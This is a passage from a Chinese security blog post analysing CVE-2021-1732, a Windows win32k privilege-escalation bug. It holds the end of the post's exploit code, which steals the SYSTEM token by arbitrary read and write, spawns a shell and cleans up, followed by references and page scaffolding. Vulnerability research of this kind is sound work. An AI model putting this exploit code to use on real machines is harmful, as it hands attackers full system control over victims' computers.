&#125;</span><br><span class="line">        ULONG64 systemToken = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess + TOKEN_OFFSET);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Get systemToken : %llx\n&quot;</span>, systemToken);</span><br><span class="line"></span><br><span class="line">        ULONG64 writeAddr = currentEprocess + TOKEN_OFFSET;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">arbWrite</span>(hWnds[<span class="number">0</span>], hWnds[<span class="number">1</span>], WNDk01Offset, writeAddr, systemToken);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">spawn_shell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get eprocess\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recover begin!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PVOID chunk = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, CB_WND_EXTRA_2, MEM_COMMIT, PAGE_READWRITE);;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk02Offset + WND_EXTRA_BYTES_OFFSET, (ULONG64)chunk);</span><br><span class="line"></span><br><span class="line">    ULONG64 dwFlags = *(ULONG64*)((PBYTE)(pWnds) + MODIFY_OFFSET_FLAG_OFFSET);</span><br><span class="line">    dwFlags ^= <span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk02Offset + MODIFY_OFFSET_FLAG_OFFSET, (ULONG64)chunk);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    dwStyle |= <span class="number">0x4000000000000000</span>L; <span class="comment">// set WS_CHILD</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + DW_EXSTYLE_OFFSET, dwStyle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">1</span>], GWLP_ID, (ULONG64)oldPMenu); <span class="comment">// recover oldPMenu</span></span><br><span class="line"></span><br><span class="line">    dwStyle ^= <span class="number">0x4000000000000000</span>L; <span class="comment">// dwStyle recover</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + DW_EXSTYLE_OFFSET, dwStyle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// recover pExtraBytes</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + WND_EXTRA_BYTES_OFFSET, originWNDExtraBytes);</span><br><span class="line"></span><br><span class="line">    PULONG64 params[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    params[<span class="number">0</span>] = (PULONG64)hWnd;</span><br><span class="line">    params[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DestroyMenu</span>(hHelpMenu);</span><br><span class="line">    <span class="built_in">DestroyMenu</span>(hMenu);</span><br><span class="line">    <span class="built_in">DestroyWindow</span>(hWnds[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">DestroyWindow</span>(hWnds[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(gPFakeSpMenu, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">VirtualFree</span>(fakeUnknownChunk, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">VirtualFree</span>(gPFakeRgItems, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">VirtualFree</span>(fakespMenuk, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">VirtualFree</span>(chunk, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recover success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/technical-analysis-of-cve-2021-1732/">Technical Analysis of CVE-2021-1732 | McAfee Blogs</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h2-0">CVE-2021-1732 Windows10 本地提权漏洞复现及详细分析 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-wndclassexa">WNDCLASSEXA (winuser.h) - Win32 apps | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://www.programmersought.com/article/89797235329/">Win10 tagWnd partial member reverse (window hidden, window protected) - Programmer Sought</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/29758">Microsoft Windows提权漏洞 (CVE-2021-1732) 分析 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html">CVE-2021-1732: win32kfull xxxCreateWindowEx callback out-of-bounds | iamelli0t’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://theevilbit.github.io/posts/a_simple_protection_against_hmvalidatehandle_technique/">A simple protection against HMValidateHandle technique · theevilbit blog</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-getmenubarinfo">GetMenuBarInfo function (winuser.h) - Win32 apps | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowlongptrw">SetWindowLongPtrW function (winuser.h) - Win32 apps | Microsoft Docs</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Vergissmeinnicht</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ret2ver.github.io/2022/01/11/CVE-2021-1732-%EF%BC%9Awin32k-%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/">https://ret2ver.github.io/2022/01/11/CVE-2021-1732-%EF%BC%9Awin32k-%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/11/CVE-2021-38001-%EF%BC%9AV8-IC-%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2021-38001 ：V8 IC 中的类型混淆漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/27/CVE-2021-31956-%EF%BC%9ANTFS-%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B1%A0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2021-31956 ：NTFS 模块的池溢出漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Vergissmeinnicht</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ret2ver"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ret2ver" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:verhan@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Live Long And Pwn.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%A1%8C%E9%9D%A2%E7%BC%96%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Windows 桌面编程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E5%AD%97%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">额外字节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tagWND-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.3.</span> <span class="toc-text">tagWND 结构体</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateWindowEx%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">CreateWindowEx流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SetWindowLongPtr%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">SetWindowLongPtr流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConsoleControl%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">ConsoleControl流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HMValidateHandle%E4%BD%BF%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">HMValidateHandle使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSOD"><span class="toc-number">3.2.</span> <span class="toc-text">BSOD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E5%B8%83%E5%B1%80%E5%92%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">3.3.</span> <span class="toc-text">堆块布局和任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E4%B8%8E%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.4.</span> <span class="toc-text">任意地址读与地址泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%8E%AF%E5%A2%83"><span class="toc-number">3.5.</span> <span class="toc-text">清理环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%BB%93%E6%9E%9C"><span class="toc-number">3.6.</span> <span class="toc-text">最后结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PATCH%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">PATCH分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-fuzz/" title="AFL源码阅读 - afl-fuzz">AFL源码阅读 - afl-fuzz</a><time datetime="2022-03-14T09:35:50.000Z" title="Created 2022-03-14 17:35:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-clang-fast/" title="AFL源码阅读 - afl-clang-fast">AFL源码阅读 - afl-clang-fast</a><time datetime="2022-03-14T06:47:50.000Z" title="Created 2022-03-14 14:47:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-as/" title="AFL源码阅读 - afl-as">AFL源码阅读 - afl-as</a><time datetime="2022-03-13T07:04:50.000Z" title="Created 2022-03-13 15:04:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-gcc/" title="AFL源码阅读 - afl-gcc">AFL源码阅读 - afl-gcc</a><time datetime="2022-03-13T05:22:50.000Z" title="Created 2022-03-13 13:22:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/05/CVE-2021-43226-%EF%BC%9ACLFS-%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="CVE-2021-43226 ：CLFS 中的栈溢出漏洞">CVE-2021-43226 ：CLFS 中的栈溢出漏洞</a><time datetime="2022-02-05T06:56:21.000Z" title="Created 2022-02-05 14:56:21">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Vergissmeinnicht</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>